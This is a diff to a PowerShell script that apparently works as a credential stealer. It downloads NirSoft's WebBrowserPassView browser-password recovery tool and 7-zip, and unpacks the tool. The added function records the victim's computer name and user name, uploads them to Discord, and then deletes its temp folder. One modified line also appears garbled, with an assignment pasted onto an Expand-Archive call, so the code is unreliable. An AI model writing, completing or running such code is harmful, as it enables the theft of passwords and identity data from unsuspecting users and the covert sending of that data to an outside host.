@@ -5,9 +5,18 @@ function Get-Nirsoft {
   cd \temp
   Invoke-WebRequest -Headers @{'Referer' = 'https://www.nirsoft.net/utils/web_browser_password.html'} -Uri https://www.nirsoft.net/toolsdownload/webbrowserpassview.zip -OutFile wbpv.zip
   Invoke-WebRequest -Uri https://www.7-zip.org/a/7za920.zip -OutFile 7z.zip
-  Expand-Archive 7z.zip 
+  Expand-Archive 7z.zip $namepc = Get-Date -UFormat "$env:computername-$env:UserName-%m-%d-%Y_%H-%M-%S"
   .\7z\7za.exe e wbpv.zip
 
+}
+
+function Info1 {
+cd C:\
+mkdir \temp
+cd \temp
+$namepc = Get-Date -UFormat "$env:computername-$env:UserName-%m-%d-%Y_%H-%M-%S" | Out-File -FilePath C:\Temp\nompc.txt -Encoding utf8
+Upload-Discord -file "C:\temp\nompc.txt" -text "Hostname, Username, Date :"
+rmdir -R \temp
 }
 
 function Upload-Discord {
